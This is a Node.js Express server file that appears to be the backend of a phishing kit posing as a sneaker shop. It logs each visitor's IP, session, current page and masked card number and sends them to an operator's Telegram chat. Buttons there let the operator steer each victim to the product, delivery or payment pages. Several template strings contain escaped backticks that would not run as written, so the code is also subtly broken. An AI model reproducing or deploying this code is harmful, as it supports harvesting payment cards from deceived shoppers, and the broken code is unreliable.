import express from "express";
import path from "path";
import { fileURLToPath } from "url";
import bodyParser from "body-parser";
import cors from "cors";
import fetch from "node-fetch";
import { v4 as uuidv4 } from "uuid";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const BASE_URL = process.env.BASE_URL || "https://basketnew.onrender.com";

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("❌ BOT_TOKEN ou CHAT_ID non défini dans Render");
}

const sessions = {};

async function sendTelegramNotif(data) {
  const msg = `
🆕 <b>Nouvelle interaction utilisateur</b>
🆔 <b>Session :</b> ${data.sessionId}
📄 <b>Page :</b> ${data.page}
👟 <b>Paire :</b> ${data.pair || "—"}
💳 <b>Carte :</b> ${data.card?.panMasked || "—"}
ℹ️ <b>Statut :</b> ${data.status}
  `;

  const keyboard = {
    inline_keyboard: [
      [{ text: "🏠 Accueil", callback_data: \`redirect|\${data.sessionId}|/\` }],
      [{ text: "👟 Choix Paire", callback_data: \`redirect|\${data.sessionId}|/product.html\` }],
      [{ text: "📦 Livraison", callback_data: \`redirect|\${data.sessionId}|/delivery.html\` }],
      [{ text: "💳 Paiement", callback_data: \`redirect|\${data.sessionId}|/payment.html\` }]
    ],
  };

  try {
    const res = await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: msg,
        parse_mode: "HTML",
        reply_markup: keyboard,
      }),
    });
    const json = await res.json();
    if (!json.ok) console.error("Erreur Telegram :", json);
  } catch (err) {
    console.error("Erreur d'envoi Telegram :", err);
  }
}

app.post("/api/visit", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const sid = req.body.sessionId || uuidv4();
  sessions[sid] = { sessionId: sid, ip, page: "Accueil", status: "Nouvelle visite" };
  sendTelegramNotif(sessions[sid]);
  res.json({ sessionId: sid });
});

app.post("/telegramWebhook", async (req, res) => {
  const body = req.body;
  if (body.callback_query) {
    const cb = body.callback_query;
    const [action, sid, url] = (cb.data || "").split("|");

    if (action === "redirect" && sid && url) {
      await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/answerCallbackQuery\`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: cb.id,
          text: \`Redirection vers \${url}\`,
        }),
      });
    }
  }
  res.sendStatus(200);
});

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(\`✅ Serveur prêt sur port \${PORT}\`));
